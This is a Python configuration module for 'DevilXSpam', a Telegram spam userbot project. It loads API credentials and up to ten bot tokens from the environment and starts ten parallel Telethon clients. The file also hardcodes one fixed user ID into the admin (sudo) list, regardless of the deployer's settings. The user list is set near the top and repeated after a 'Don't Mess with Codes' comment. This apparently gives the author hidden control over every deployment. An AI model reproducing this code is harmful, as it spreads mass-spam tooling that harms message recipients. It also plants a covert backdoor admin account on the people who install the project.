# DevilXSpam - Spam Userbots
# Copyright © 2022 @DevilX

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

Devilversion = "v2.0.3"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_MSG = config("ALIVE_MSG", default=None)
PING_MSG = config("PING_MSG", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5062902521 not in SUDO_USERS:
    SUDO_USERS.append(5062902521)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5062902521)

# Tokens

Devil = TelegramClient('Devil', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Devil2 = TelegramClient('Devil2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Devil3 = TelegramClient('Devil3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Devil4 = TelegramClient('Devil4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Devil5 = TelegramClient('Devil5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Devil6 = TelegramClient('Devil6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Devil7 = TelegramClient('Devil7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Devil8 = TelegramClient('Devil8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Devil9 = TelegramClient('Devil9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Devil10 = TelegramClient('Devil10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
